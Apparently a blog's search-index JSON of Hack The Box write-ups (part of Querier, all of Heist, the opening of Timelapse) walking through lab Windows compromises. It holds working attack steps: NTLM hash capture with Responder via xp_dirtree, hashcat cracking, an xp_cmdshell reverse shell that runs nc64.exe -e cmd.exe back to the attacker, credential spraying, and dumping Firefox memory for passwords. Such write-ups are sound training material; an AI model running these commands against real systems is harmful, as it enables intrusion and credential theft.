FortraPassword:[*] Encryption required, switching to TLS[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.[*] INFO(QUERIER): Line 1: Changed language setting to us_english.[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)[!] Press help for extra shell commandsSQL&gt;once connected, we can now run query to the database.SQL&gt; SELECT * FROM fn_my_permissions(NULL, 'SERVER');entity_name subentity_name permission_name------------ --------------- ------------------server CONNECT SQLserver VIEW ANY DATABASESQL&gt; SELECT name FROM master.sys.databasesname-------------------------------------------------------------------------------------------------------------------------------mastertempdbmodelmsdbvolumexp_dirtree is a stored procedure in Microsoft SQL Server that provides a way to retrieve a list of files and directories within a specified directory path. We’ll use xp_dirtee to load a file from our SMB share. This way, Net-NTLMv2 hash will be captured by the responder when the server tries to authenticate to my host.SQL&gt; xp_dirtree '\\\\10.10.14.11\\test';subdirectory depth------------- -----------$sudo responder -I tun0 __ .----.-----.-----.-----.-----.-----.--| |.-----.----. | _| -__|__ --| _ | _ | | _ || -__| _| |__| |_____|_____| __|_____|__|__|_____||_____|__| |__| NBT-NS, LLMNR &amp; MDNS Responder 3.0.6.0 Author: Laurent Gaffie (laurent.gaffie@gmail.com) To kill this script hit CTRL-C[+] Poisoners: LLMNR [ON] NBT-NS [ON] DNS/MDNS [ON][+] Servers: HTTP server [ON] HTTPS server [ON] WPAD proxy [OFF] Auth proxy [OFF] SMB server [ON] Kerberos server [ON] SQL server [ON] FTP server [ON] IMAP server [ON] POP3 server [ON] SMTP server [ON] DNS server [ON] LDAP server [ON] RDP server [ON] DCE-RPC server [ON] WinRM server [ON][+] HTTP Options: Always serving EXE [OFF] Serving EXE [OFF] Serving HTML [OFF] Upstream Proxy [OFF][+] Poisoning Options: Analyze Mode [OFF] Force WPAD auth [OFF] Force Basic Auth [OFF] Force LM downgrade [OFF] Fingerprint hosts [OFF][+] Generic Options: Responder NIC [tun0] Responder IP [10.10.14.11] Challenge set [random] Don't Respond To Names ['ISATAP'][+] Current Session Variables: Responder Machine Name [WIN-080BVO53VJ6] Responder Domain Name [5LWK.LOCAL] Responder DCE-RPC Port [45564][!] Error starting TCP server on port 3389, check permissions or other servers running.[+] Listening for events...[SMB] NTLMv2-SSP Client : 10.10.10.125[SMB] NTLMv2-SSP Username : QUERIER\\mssql-svc[SMB] NTLMv2-SSP Hash : mssql-svc::QUERIER:d02ec612c5a555b3:9F5C20033BF0D5C395F84B10229DFBDC:01010000000000008098843AD838D9018AAD0038DFFC50E7000000000200080035004C0057004B0001001E00570049004E002D00300038003000420056004F003500330056004A00360004003400570049004E002D00300038003000420056004F003500330056004A0036002E0035004C0057004B002E004C004F00430041004C000300140035004C0057004B002E004C004F00430041004C000500140035004C0057004B002E004C004F00430041004C00070008008098843AD838D901060004000200000008003000300000000000000000000000003000005E3D6425BEDABAD60351015493021F33D9FAB339BE7DCAF0634896891740263D0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003100000000000000000000000000CRACK NetNTMLv2using hashcat to crack NetNTMLv2 hash.$hashcat -m 5600 hash /usr/share/wordlists/rockyou.txtMSSQL-SVC::QUERIER:d02ec612c5a555b3:9f5c20033bf0d5c395f84b10229dfbdc:01010000000000008098843ad838d9018aad0038dffc50e7000000000200080035004c0057004b0001001e00570049004e002d00300038003000420056004f003500330056004a00360004003400570049004e002d00300038003000420056004f003500330056004a0036002e0035004c0057004b002e004c004f00430041004c000300140035004c0057004b002e004c004f00430041004c000500140035004c0057004b002e004c004f00430041004c00070008008098843ad838d901060004000200000008003000300000000000000000000000003000005e3d6425bedabad60351015493021f33d9fab339be7dcaf0634896891740263d0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003100000000000000000000000000:corporate568Session..........: hashcatStatus...........: CrackedHash.Name........: NetNTLMv2Hash.Target......: MSSQL-SVC::QUERIER:d02ec612c5a555b3:9f5c20033bf0d5c...000000Time.Started.....: Sat Feb 4 20:43:12 2023 (15 secs)Time.Estimated...: Sat Feb 4 20:43:27 2023 (0 secs)Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)Guess.Queue......: 1/1 (100.00%)Speed.#1.........: 585.4 kH/s (4.70ms) @ Accel:1024 Loops:1 Thr:1 Vec:8Recovered........: 1/1 (100.00%) DigestsProgress.........: 8962048/14344385 (62.48%)Rejected.........: 0/8962048 (0.00%)Restore.Point....: 8957952/14344385 (62.45%)Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1Candidates.#1....: correita.54 -&gt; coreyr1Started: Sat Feb 4 20:42:19 2023Stopped: Sat Feb 4 20:43:29 2023LOG IN AS MSSQL-SRVwe can now login as mssql-svc account with username mssql-src and password corporate568$python3 mssqlclient.py MSSQL-SVC@10.10.10.125 -windows-authImpacket v0.10.1.dev1+20230120.195338.34229464 - Copyright 2022 FortraPassword:[*] Encryption required, switching to TLS[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192[*] INFO(QUERIER): Line 1: Changed database context to 'master'.[*] INFO(QUERIER): Line 1: Changed language setting to us_english.[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)[!] Press help for extra shell commandsSQL&gt;while trying to run commands, it didnot let us run commands as xp_cmdshell was not enabled.SQL&gt; xp_cmdshell whoami[-] ERROR(QUERIER): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.we can use enable_xp_cmdshell that enable us to run commands.SQL&gt; enable_xp_cmdshell[*] INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.[*] INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.SQL&gt; xp_cmdshell whoamioutput--------------------------------------------------------------------------------querier\\mssql-svcSHELL AS MSSQL-SVCTo get shell on the box, we’ll host nc64.exe binary on our smb server. we are also hosting PowerUp.ps1 which we’ll use later for enumeration.$lsnc64.exe PowerUp.ps1$sudo impacket-smbserver share . -smb2supportImpacket v0.10.1.dev1+20230120.195338.34229464 - Copyright 2022 Fortra[*] Config file parsed[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0[*] Config file parsed[*] Config file parsed[*] Config file parsed[*] Incoming connection (10.10.10.125,49696)[*] AUTHENTICATE_MESSAGE (QUERIER\\mssql-svc,QUERIER)[*] User QUERIER\\mssql-svc authenticated successfully[*] mssql-svc::QUERIER:aaaaaaaaaaaaaaaa:0c02ceff915f9f1f61f3318245331ed6:010100000000000080b309290d39d9016e147c741a2f604b00000000010010007200670053006f007200490070005900030010007200670053006f00720049007000590002001000620052006e005300690071005800620004001000620052006e00530069007100580062000700080080b309290d39d901060004000200000008003000300000000000000000000000003000005e3d6425bedabad60351015493021f33d9fab339be7dcaf0634896891740263d0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003100000000000000000000000000now, again we will use xp_cmdshell, this time it will execute nc64.exe from our smbserver. we will also start a nc listener on our box .$sudo impacket-mssqlclient MSSQL-SVC@10.10.10.125 -windows-authImpacket v0.10.1.dev1+20230120.195338.34229464 - Copyright 2022 FortraPassword:[*] Encryption required, switching to TLS[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192[*] INFO(QUERIER): Line 1: Changed database context to 'master'.[*] INFO(QUERIER): Line 1: Changed language setting to us_english.[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)[!] Press help for extra shell commandsSQL&gt; enable_xp_cmdshell[*] INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.[*] INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.SQL&gt; xp_cmdshell \\\\10.10.14.11\\share\\nc64.exe -e cmd.exe 10.10.14.11 4444 outputand we got the shell as mssql-svc.$sudo rlwrap nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.14.11] from (UNKNOWN) [10.10.10.125] 49697Microsoft Windows [Version 10.0.17763.292](c) 2018 Microsoft Corporation. All rights reserved.C:\\Windows\\system32&gt;whoamiquerier\\mssql-svcSHELL AS ADMINISTRATORDownloading PowerUp.ps1 on the box.C:\\Users\\mssql-svc\\Desktop&gt;copy \\\\10.10.14.11\\share\\PowerUp.ps1switching our shell to powershell.C:\\Windows\\system32&gt; powershell Windows PowerShellCopyright (C) Microsoft Corporation. All rights reserved.PS C:\\Users\\mssql-svc\\Desktop&gt;importing PowerUp.ps1PS C:\\Users\\mssql-svc\\Desktop&gt;. .\\PowerUp.ps1now we can run Invoke-AllChecksPS C:\\Users\\mssql-svc\\Desktop&gt; Invoke-AllChecks Privilege : SeImpersonatePrivilegeAttributes : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLEDTokenHandle : 2132ProcessId : 3316Name : 3316Check : Process Token PrivilegesServiceName : UsoSvcPath : C:\\Windows\\system32\\svchost.exe -k netsvcs -pStartName : LocalSystemAbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'CanRestart : TrueName : UsoSvcCheck : Modifiable ServicesModifiablePath : C:\\Users\\mssql-svc\\AppData\\Local\\Microsoft\\WindowsAppsIdentityReference : QUERIER\\mssql-svcPermissions : {WriteOwner, Delete, WriteAttributes, Synchronize...}%PATH% : C:\\Users\\mssql-svc\\AppData\\Local\\Microsoft\\WindowsAppsName : C:\\Users\\mssql-svc\\AppData\\Local\\Microsoft\\WindowsAppsCheck : %PATH% .dll HijacksAbuseFunction : Write-HijackDll -DllPath 'C:\\Users\\mssql-svc\\AppData\\Local\\Microsoft\\WindowsApps\\wlbsctrl.dll'UnattendPath : C:\\Windows\\Panther\\Unattend.xmlName : C:\\Windows\\Panther\\Unattend.xmlCheck : Unattended Install FilesChanged : {2019-01-28 23:12:48}UserNames : {Administrator}NewName : [BLANK]Passwords : {MyUnclesAreMarioAndLuigi!!1!}File : C:\\ProgramData\\Microsoft\\Group Policy\\History\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\Machine\\Preferences\\Groups\\Groups.xmlCheck : Cached GPP FilesHere, we got credentials for administratror through Groups.xmlusing impacket-psexec to login to the administrator user.$sudo impacket-psexec administrator@10.10.10.125Impacket v0.10.1.dev1+20230120.195338.34229464 - Copyright 2022 FortraPassword:[*] Requesting shares on 10.10.10.125.....[*] Found writable share ADMIN$[*] Uploading file OlkQmibA.exe[*] Opening SVCManager on 10.10.10.125.....[*] Creating service rDqZ on 10.10.10.125.....[*] Starting service rDqZ.....[!] Press help for extra shell commands Microsoft Windows [Version 10.0.17763.292](c) 2018 Microsoft Corporation. All rights reserved.C:\\Windows\\system32&gt;whoami nt authority\\systemC:\\Windows\\system32&gt;type C:\\Users\\Administrator\\Desktop\\root.txt0def3d8ef83671c3a7aa76c58626ead1" }, { "title": "eLearnSecurity - eJPTv2", "url": "/posts/Ejptv2/", "categories": "", "tags": "", "date": "2023-02-03 00:00:00 -0500", "snippet": "", "content": "" }, { "title": "Hack The Box - Heist", "url": "/posts/Hack-The-Box-Hiest/", "categories": "hackthebox", "tags": "windows, rpcclient, crackmapexec, impacket-lookupsid, procdump, easy", "date": "2023-01-29 00:00:00 -0500", "snippet": "Heist was an easy box that involved some password cracking and dumping Firefox’s processes.At first, we found a Cisco configuration file on the website that contained usernames and password hashes....", "content": "Heist was an easy box that involved some password cracking and dumping Firefox’s processes.At first, we found a Cisco configuration file on the website that contained usernames and password hashes. After recovering passwords, we found one that worked to get RPC access, through which we found more usernames.We then got a Winrm session from one of these usernames and passwords. We observed that Firefox was running and dumped its process memory to uncover the password for the website, which also happened to be the administrator password for the system.RECONNMAPStarting with nmap it shows few ports open. Port 80: Microsoft IIS httpd 10.0 Port 135: Microsoft Windows RPC Port 445: SMB Port 5985: WinRM$sudo nmap -sC -sV -p- --min-rate 10000 -oN Heist-all-tcp.nmap 10.10.10.149 [sudo] password for niraz: Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-09 07:32 +0545 Nmap scan report for 10.10.10.149 Host is up (0.079s latency). Not shown: 65530 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set | http-title: Support Login Page |_Requested resource was login.php |_http-server-header: Microsoft-IIS/10.0 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds? 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 49669/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required | smb2-time: | date: 2023-01-09T01:49:00 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 109.73 secondsWEB - ENUMERATIONIt presents a login form.tried some basic email and password, it did not work.LOGIN AS GUESTAfter login as guest, we can see it’s some kind of support portal and hazard has uploaded cisco router configuration file as an attachment.We can view the configuration file.version 12.2 no service pad service password-encryption ! isdn switch-type basic-5ess ! hostname ios-1 ! security passwords min-length 12 enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91 ! username rout3r password 7 0242114B0E143F015F5D1E161713 username admin privilege 15 password 7 02375012182C1A1D751618034F36415408 ! ! ip ssh authentication-retries 5 ip ssh version 2 ! ! router bgp 100 synchronization bgp log-neighbor-changes bgp dampening network 192.168.0.0Â mask 300.255.255.0 timers bgp 3 9 redistribute connected ! ip classless ip route 0.0.0.0 0.0.0.0 192.168.0.1 ! ! access-list 101 permit ip any any dialer-list 1 protocol ip list 101 ! no ip http server no ip http secure-server ! line vty 0 4 session-timeout 600 authorization exec SSH transport input sshFrom the above configuration file we can see there are three password hashes. Hash Hash Type $1$pdQG$o8nrSzsGXeaduXrjlvKc91 Cisco Type 5 salted md5 0242114B0E143F015F5D1E161713 Cisco Type 7 02375012182C1A1D751618034F36415408 Cisco Type 7 TYPE 7 DECRYPTType 7 password can be decrypted using any online tools. Using this tool to decrypt type 7 password.0242114B0E143F015F5D1E161713: $uperP@ssword02375012182C1A1D751618034F36415408: Q4)sJu\\Y8qz*A3?dTYPE 5 DECRYPTUsing hashcat to decrypt this hash.$hashcat -m 500 hash /usr/share/wordlists/rockyou.txt$1$pdQG$o8nrSzsGXeaduXrjlvKc91:stealth1agent Session..........: hashcat Status...........: Cracked Hash.Name........: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5) Hash.Target......: $1$pdQG$o8nrSzsGXeaduXrjlvKc91 Time.Started.....: Mon Jan 9 08:11:22 2023 (8 mins, 46 secs) Time.Estimated...: Mon Jan 9 08:20:08 2023 (0 secs) Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 6644 H/s (20.35ms) @ Accel:256 Loops:250 Thr:1 Vec:16 Recovered........: 1/1 (100.00%) Digests Progress.........: 3543552/14344385 (24.70%) Rejected.........: 0/3543552 (0.00%) Restore.Point....: 3543040/14344385 (24.70%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:750-1000 Candidates.#1....: steauara -&gt; steakdinow we have few usernames and passwords$cat usernames.txt admin rout3r Hazard $cat passwords.txt Q4)sJu\\Y8qz*A3?d @sswordf stealth1agentSMB - TCP 445without creds$smbmap -H 10.10.10.149 [!] Authentication error on 10.10.10.149smbmap gives authentication error, it means to need valid creds to view the shares.CRACKMAPEXECUsing crackmapexec we can give a list of username and password. We’ll use creds we have gather till now.$cme smb -u username.txt -p password.txt --shares 10.10.10.149 SMB 10.10.10.149 445 SUPPORTDESK [*] Windows 10.0 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False) SMB 10.10.10.149 445 SUPPORTDESK [-] SupportDesk\\admin:Q4)sJu\\Y8qz*A3?d STATUS_LOGON_FAILURE SMB 10.10.10.149 445 SUPPORTDESK [-] SupportDesk\\admin:@sswordf STATUS_LOGON_FAILURE SMB 10.10.10.149 445 SUPPORTDESK [-] SupportDesk\\admin:stealth1agent STATUS_LOGON_FAILURE SMB 10.10.10.149 445 SUPPORTDESK [-] SupportDesk\\rout3r:Q4)sJu\\Y8qz*A3?d STATUS_LOGON_FAILURE SMB 10.10.10.149 445 SUPPORTDESK [-] SupportDesk\\rout3r:@sswordf STATUS_LOGON_FAILURE SMB 10.10.10.149 445 SUPPORTDESK [-] SupportDesk\\rout3r:stealth1agent STATUS_LOGON_FAILURE SMB 10.10.10.149 445 SUPPORTDESK [-] SupportDesk\\Hazard:Q4)sJu\\Y8qz*A3?d STATUS_LOGON_FAILURE SMB 10.10.10.149 445 SUPPORTDESK [-] SupportDesk\\Hazard:@sswordf STATUS_LOGON_FAILURE SMB 10.10.10.149 445 SUPPORTDESK [+] SupportDesk\\Hazard:stealth1agent SMB 10.10.10.149 445 SUPPORTDESK [+] Enumerated shares SMB 10.10.10.149 445 SUPPORTDESK Share Permissions Remark SMB 10.10.10.149 445 SUPPORTDESK ----- ----------- ------ SMB 10.10.10.149 445 SUPPORTDESK ADMIN$ Remote Admin SMB 10.10.10.149 445 SUPPORTDESK C$ Default share SMB 10.10.10.149 445 SUPPORTDESK IPC$ READ Remote IPCand we found the valid creds Hazard:stealth1agent . we can now re run smbmap with this creds.$smbmap -u hazard -p stealth1agent -H 10.10.10.149 [+] IP: 10.10.10.149:445 Name: 10.10.10.149 Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share IPC$ READ ONLY Remote IPCRPCCLIENT$rpcclient -U 'hazard%stealth1agent' 10.10.10.149we can get SID of user we know using lookupnames.$rpcclient -U 'hazard%stealth1agent' 10.10.10.149 $rpcclient $&gt; lookupnames hazard hazard S-1-5-21-4254423774-1266059056-3197185112-1008 (User: 1)we can also get user accounts using the SID.$rpcclient $&gt; lookupsids S-1-5-21-4254423774-1266059056-3197185112-1008 S-1-5-21-4254423774-1266059056-3197185112-1008 SUPPORTDESK\\Hazard (1)Using rpcclient with -c command to directly interact with the command line so that we can bruteforce SIDS.$rpcclient -U 'hazard%stealth1agent' 10.10.10.149 -c 'lookupsids S-1-5-21-4254423774-1266059056-3197185112-1008' S-1-5-21-4254423774-1266059056-3197185112-1008 SUPPORTDESK\\Hazard (1)$for i in {1000..1050};do rpcclient -U 'hazard%stealth1agent' 10.10.10.149 -c \"lookupsids S-1-5-21-4254423774-1266059056-3197185112-$i\" | grep -v unknown;done S-1-5-21-4254423774-1266059056-3197185112-1008 SUPPORTDESK\\Hazard (1) S-1-5-21-4254423774-1266059056-3197185112-1009 SUPPORTDESK\\support (1) S-1-5-21-4254423774-1266059056-3197185112-1012 SUPPORTDESK\\Chase (1) S-1-5-21-4254423774-1266059056-3197185112-1013 SUPPORTDESK\\Jason (1)impacket-lookupsid can be used to bruteforce SIDs$impacket-lookupsid hazard:stealth1agent@10.10.10.149 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation [*] Brute forcing SIDs at 10.10.10.149 [*] StringBinding ncacn_np:10.10.10.149[\\pipe\\lsarpc] [*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112 500: SUPPORTDESK\\Administrator (SidTypeUser) 501: SUPPORTDESK\\Guest (SidTypeUser) 503: SUPPORTDESK\\DefaultAccount (SidTypeUser) 504: SUPPORTDESK\\WDAGUtilityAccount (SidTypeUser) 513: SUPPORTDESK\\None (SidTypeGroup) 1008: SUPPORTDESK\\Hazard (SidTypeUser) 1009: SUPPORTDESK\\support (SidTypeUser) 1012: SUPPORTDESK\\Chase (SidTypeUser) 1013: SUPPORTDESK\\Jason (SidTypeUser)we have now got few more users. updating our usernames file.$cat usernames.txt admin rout3r Hazard Administrator Guest support chase JasonSHELL AS CHASEMETASPLOITUsing metasploit to find valid creds for winrm.[msf](Jobs:0 Agents:0) auxiliary(scanner/winrm/winrm_login) &gt;&gt; show options Module options (auxiliary/scanner/winrm/winrm_login): Name Current Setting Required Description ---- --------------- -------- ----------- BLANK_PASSWORDS false no Try blank passwords for all users BRUTEFORCE_SPEED 5 yes How fast to bruteforce, from 0 to 5 DB_ALL_CREDS false no Try each user/password couple stored in the current database DB_ALL_PASS false no Add all passwords in the current database to the list DB_ALL_USERS false no Add all users in the current database to the list DB_SKIP_EXISTING none no Skip existing credentials stored in the current database (Accepted: none, user, user&amp;realm) DOMAIN WORKSTATION yes The domain to use for Windows authentification PASSWORD no A specific password to authenticate with PASS_FILE passwords.txt no File containing passwords, one per line Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.10.149 yes The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit RPORT 5985 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections STOP_ON_SUCCESS true yes Stop guessing when a credential works for a host THREADS 1 yes The number of concurrent threads (max one per host) URI /wsman yes The URI of the WinRM service USERNAME no A specific username to authenticate as USERPASS_FILE no File containing users and passwords separated by space, one pair per line USER_AS_PASS false no Try the username as the password for all users USER_FILE usernames.txt no File containing usernames, one per line VERBOSE true yes Whether to print output for all attempts VHOST no HTTP server virtual host [msf](Jobs:0 Agents:0) auxiliary(scanner/winrm/winrm_login) &gt;&gt; run [-] 10.10.10.149: - LOGIN FAILED: WORKSTATION\\admin:Q4)sJu\\Y8qz*A3?d (Incorrect: ) [-] 10.10.10.149: - LOGIN FAILED: WORKSTATION\\admin:@sswordf (Incorrect: ) [-] 10.10.10.149: - LOGIN FAILED: WORKSTATION\\admin:stealth1agent (Incorrect: ) [+] 10.10.10.149:5985 - Login Successful: WORKSTATION\\chase:Q4)sJu\\Y8qz*A3?dwe can see that chase can winrm. Using evil-winrm to get the shell.$evil-winrm -i 10.10.10.149 -u chase -p \"Q4)sJu\\Y8qz*A3?d\" Evil-WinRM shell v3.4 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Chase\\Documents&gt;SHELL AS ADMINISTRATORThere’s a todo list in the chase desktop that says to keep checking the issues list, which can be done using a browser, browsing the support portal we found earlier.*Evil-WinRM* PS C:\\Users\\Chase\\Desktop&gt; type todo.txt Stuff to-do: 1. Keep checking the issues list. 2. Fix the router config. Done: 1. Restricted access for guest user.running ps command we can see a bunch of firefox process.*Evil-WinRM* PS C:\\Users\\Chase\\Desktop&gt; ps Handles NPM(K) PM(K) WS(K) CPU(s) Id SI ProcessName ------- ------ ----- ----- ------ -- -- ----------- 347 19 10232 287536 0.17 740 1 firefox 401 34 39024 96248 2.30 2944 1 firefox 1065 71 149328 227156 8.34 3916 1 firefox 378 28 23692 60496 1.33 5876 1 firefox 356 25 16528 39016 0.17 6408 1 firefoxGET CREDS FROM FIREFOXUsing procdump from sysinternals tool to run against one of the process of firefox.*Evil-WinRM* PS C:\\Users\\Chase\\Documents&gt; upload procdump64.exeInfo: Uploading procdump64.exe to C:\\Users\\Chase\\Documents\\procdump64.exeData: 566472 bytes of 566472 bytes copiedInfo: Upload successful!*Evil-WinRM* PS C:\\Users\\Chase\\Documents&gt; .\\procdump64 -ma 740 -accepteulaProcDump v11.0 - Sysinternals process dump utilityCopyright (C) 2009-2022 Mark Russinovich and Andrew RichardsSysinternals - www.sysinternals.com[20:49:10] Dump 1 initiated: C:\\Users\\Chase\\Documents\\firefox.exe_230129_204910.dmp[20:49:10] Dump 1 writing: Estimated dump file size is 288 MB.[20:49:10] Dump 1 complete: 288 MB written in 0.4 seconds[20:49:10] Dump count reached.Downloading the dump.*Evil-WinRM* PS C:\\Users\\Chase\\Documents&gt; download firefox.exe_230129_204910.dmpStrings can be used to grep password from the dump file, and we got login usernamd and password from it.$strings firefox.exe_230129_134546.dmp | grep password=MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&amp;login_password=4dD!5}x/re8]FBuZ&amp;login=RG_1=localhost/login.php?login_username=admin@support.htb&amp;login_password=4dD!5}x/re8]FBuZ&amp;login=MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&amp;login_password=4dD!5}x/re8]FBuZ&amp;login= label-password=\"&amp;fillPasswordMenu.label;\" accesskey-password=\"&amp;fillPasswordMenu.accesskey;\" label-password=\"&amp;fillPasswordMenu.label;\" accesskey-password=\"&amp;fillPasswordMenu.accesskey;\"and we got shell as administrator$evil-winrm -i 10.10.10.149 -u administrator -p '4dD!5}x/re8]FBuZ'Evil-WinRM shell v3.4Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt;*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop&gt; whoamisupportdesk\\administrator*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop&gt; type root.txtcaf30de94a7ba38168831b756dee6dea" }, { "title": "Hack The Box - Timelapse", "url": "/posts/Hack-The-Box-Timelapse/", "categories": "hackthebox", "tags": "windows, active directory, smbclient, LAPS, openssl, john, pfx2john, powerShell history file, easy", "date": "2023-01-28 00:00:00 -0500", "snippet": "RECONNMAPNmap shows multiple ports open. Since ldap, kerberos, DNS and SMB ports are open it’s probably a Domain Controller.Nmap script shows that the domain name is timelapse.htb$nmap -Pn -p- --mi...", "content": "RECONNMAPNmap shows multiple ports open. Since ldap, kerberos, DNS and SMB ports are open it’s probably a Domain Controller.Nmap script shows that the domain name is timelapse.htb$nmap -Pn -p- --min-rate 10000 10.10.11.152 Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-28 09:24 +0545Nmap scan report for timelapse.htb (10.10.11.152)Host is up (0.077s latency).Not shown: 65517 filtered tcp ports (no-response)PORT STATE SERVICE53/tcp open domain88/tcp open kerberos-sec135/tcp open msrpc139/tcp open netbios-ssn389/tcp open ldap445/tcp open microsoft-ds464/tcp open kpasswd5593/tcp open http-rpc-epmap636/tcp open ldapssl3268/tcp open globalcatLDAP3269/tcp open globalcatLDAPssl5986/tcp open wsmans9389/tcp open adws49667/tcp open unknown49673/tcp open unknown49674/tcp open unknown49692/tcp open unknown49701/tcp open unknown$nmap -Pn -p53,88,135,139,445,464,593,636,3268,3269,5986,9389,49673,49674,49692,49701 -sC -sV 10.10.11.152Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-28 09:27 +0545Nmap scan report for timelapse.htb (10.10.11.152)Host is up (0.076s latency).PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-01-28 11:41:57Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open ldapssl?3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)3269/tcp open globalcatLDAPssl?5986/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0| tls-alpn:|_ http/1.1|_ssl-date: 2023-01-28T11:43:27+00:00; +7h59m20s from scanner time.| ssl-cert: Subject: commonName=dc01.timelapse.htb| Not valid before: 2021-10-25T14:05:29|_Not valid after: 2022-10-25T14:25:29|_http-title: Not Found9389/tcp open mc-nmf .NET Message Framing49673/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049674/tcp open msrpc Microsoft Windows RPC49692/tcp open msrpc Microsoft Windows RPC49701/tcp open msrpc Microsoft Windows RPCService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 7h59m19s, deviation: 0s, median: 7h59m19s| smb2-time:| date: 2023-01-28T11:42:49|_ start_date: N/A| smb2-security-mode:| 3.1.1:|_ Message signing enabled and requiredService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 98.26 secondsSMB - PORT 445SMBCLIENTUsing smbclinet to list shares using Null Authentication. The shares ADMIN$ C$ and IPC$ are default on all windows system . NETLOGON and SYSVOL are standard for any domain controller (DC). Shares seems to be the intresting one here.smbclient -L //10.10.11.152 -N Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC NETLOGON Disk Logon server share Shares Disk SYSVOL Disk Logon server shareSMB1 disabled -- no workgroup availableThere’s two directories Dev and HelpDesk.smbclient -N //10.10.11.152/shares Try \"help\" to get a list of possible commands.smb: \\&gt; dir . D 0 Mon Oct 25 21:24:15 2021 .. D 0 Mon Oct 25 21:24:15 2021 Dev D 0 Tue Oct 26 01:25:06 2021 HelpDesk D 0 Mon Oct 25 21:33:42 2021Dev has a winrm_backup.zip file, we will download it to our machine and HelpDesk 